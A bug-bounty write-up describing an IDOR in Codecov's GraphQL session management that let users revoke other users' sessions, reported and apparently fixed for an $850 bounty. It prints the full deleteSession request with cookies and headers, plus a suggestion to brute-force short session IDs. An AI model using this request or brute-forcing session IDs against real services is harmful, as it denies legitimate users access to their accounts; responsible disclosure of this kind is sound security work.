---
title: 850$ IDOR:Unauthorized Session Revokation of any user
url: https://infosecwriteups.com/850-idor-unauthorized-session-revokation-of-any-user-93f9cb92fdfe?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-09-11
fetch_date: 2025-10-06T18:26:55.360609
---

# 850$ IDOR:Unauthorized Session Revokation of any user

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F93f9cb92fdfe&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F850-idor-unauthorized-session-revokation-of-any-user-93f9cb92fdfe&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F850-idor-unauthorized-session-revokation-of-any-user-93f9cb92fdfe&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://me.dm/%40a13h1)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-93f9cb92fdfe---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-93f9cb92fdfe---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# 850$ IDOR:Unauthorized Session Revokation of any user

[![Abhi Sharma](https://miro.medium.com/v2/resize:fill:64:64/1*sBSRPckiQ7rHLIsqREevhw.png)](https://medium.com/%40a13h1?source=post_page---byline--93f9cb92fdfe---------------------------------------)

[Abhi Sharma](https://medium.com/%40a13h1?source=post_page---byline--93f9cb92fdfe---------------------------------------)

4 min read

·

Sep 7, 2024

--

2

Listen

Share

**Hi Everyone,** I’m thrilled to share another intriguing vulnerability I uncovered, this time in Codecov’s session management system. This vulnerability, an Insecure Direct Object Reference (IDOR), allows attackers to delete sessions of other users, leading to unauthorized session revocation. For this discovery, I was awarded a bounty of $850.

Press enter or click to view image in full size

![]()

> **Understanding the Target: Codecov**

Codecov is a popular code coverage tool that integrates with various continuous integration (CI) services, helping developers and organizations ensure code quality. It provides detailed coverage reports and facilitates the detection of code issues. However, a critical flaw in its session management system allows unauthorized users to terminate sessions of other users, disrupting their access to the platform.

> **The Vulnerability: Unauthorized Session Revocation**

In Codecov, sessions are managed through GraphQL endpoints, allowing users to maintain continuous access to their accounts. I discovered that by manipulating certain parameters in the session management requests, an attacker could revoke the sessions of any user. This vulnerability is a prime example of an Insecure Direct Object Reference (IDOR), where direct access to objects is not properly secured, allowing unauthorized actions.

> **Understanding the Bug Type: Insecure Direct Object Reference (IDOR)**

This vulnerability falls under **Insecure Direct Object Reference (IDOR)**. IDOR occurs when an application exposes a reference to an internal object, such as a file or database key, in a way that allows unauthorized users to manipulate it and perform actions they shouldn’t be allowed to perform. In this case, Codecov’s GraphQL endpoint allows direct manipulation of session IDs, leading to unauthorized session termination.

Press enter or click to view image in full size

![]()

### Steps to Reproduce

* Ensure you are logged in to the Codecov platform with a user account.
* Use the following HTTP POST request for the GraphQL endpoint (`/graphql/gh`) with the necessary parameters to delete a session:

```
POST /graphql/gh HTTP/2
Host: api.codecov.io
Cookie: csrftoken=AEtIUAZfqtvzw8xQyIe4JWXdRUBqTIXq; sessionid=aqcpl41eemtojsxc5mvj3zona3gpkiuu; ajs_anonymous_id=c2c9aba0-4b31-425b-bba2-de417627ff54; _marketing_tags="utm_department=marketing&utm_source=direct"; session_expiry=2024-04-29T15:37:57.059539Z; _gcl_au=1.1.829559452.1713411868.314166038.1714398110.1714398109
Content-Length: 241
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Baggage: sentry-environment=production,sentry-public_key=63d24de2afa542ca8779d1ee5d395abc,sentry-trace_id=61bce3ab562546bb867b761e93f14c3f,sentry-sample_rate=0.2,sentry-sampled=true
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/json; charset=utf-8
Accept: application/json
Token-Type: github-token
Sentry-Trace: 56d90707f39a4f569d78148fd442ffa5-b9b5169d5e118dea-1
Sec-Ch-Ua-Platform: "Linux"
Origin: https://app.codecov.io
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.codecov.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{"query":"\n      mutation DeleteSession($input: DeleteSessionInput!) {\n        deleteSession(input: $input) {\n          error {\n            __typename\n          }\n        }\n      }\n    ","variables":{"input":{"sessionid": TARGET_SESSION_ID}}}
```

* Substitute `[TARGET_SESSION_ID]` with the actual session ID of the target user.

> The session IDs used by Codecov are relatively short, comprising only eight digits. This predictability makes them vulnerable to brute-force attacks, where an attacker can systematically guess or iterate through possible combinations to identify valid session IDs.

* Submit the request to delete the target user’s session. A response indicating success means the session has been revoked.

> **Impact:**

This vulnerability poses a significant security risk to Codecov users as it enables attackers to compromise the confidentiality, integrity, and availability of user accounts by revoking sessions of legitimate users. The primary impacts include:

* **Unauthorized Session Termination**: Attackers can disrupt user access by revoking their sessions without proper authorization.
* **Loss of User Control**: Legitimate users lose control over their sessions.
* **Denial of Service**: The ability to terminate sessions can be used to deny users access to their accounts, impacting their ability to work effectively.

> **Response and Resolution**

Upon discovering this vulnerability, I promptly reported it to the Codecov security team. The issue was reviewed, and I was awarded a bounty of $850 for identifying and reporting the flaw. Codecov is implemented a fix to ensure that session revocation actions are appropriately restricted and authenticated.

![]()

> **Support and Follow**

If you found this write-up insightful, please leave a clap and share your feedback in the comments. Follow me for more exciting findings and cybersecurity tips!

> **Find me on Twitter:** [**@a13h1\_**](https://twitter.com/a13h1_)

### Thank you for your continued support. Keep clapping, commenting, and sharing your thoughts!

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----93f9cb92fdfe----------------------...